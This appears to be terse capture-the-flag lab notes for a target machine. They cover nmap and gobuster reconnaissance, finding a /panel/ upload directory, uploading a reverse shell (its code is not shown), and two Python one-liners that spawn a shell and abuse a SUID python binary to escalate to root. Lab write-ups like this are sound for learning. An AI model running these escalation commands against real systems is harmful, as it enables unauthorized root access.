 IP address 10.10.255.168

nmap scan result open port 80 http and 22 ssh

# Got /panel/ dir inside our server using gobuster

After uploading reverse shell

1. got Access to linux machine (User Access)

For checking -perm root user :
We Got /usr/bin/python for prvese 

python -c 'import pty; pty.spawn("/bin/bash")'
bash-4.4$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

these two cmd help to get shell & get suid for previlege Escalation.


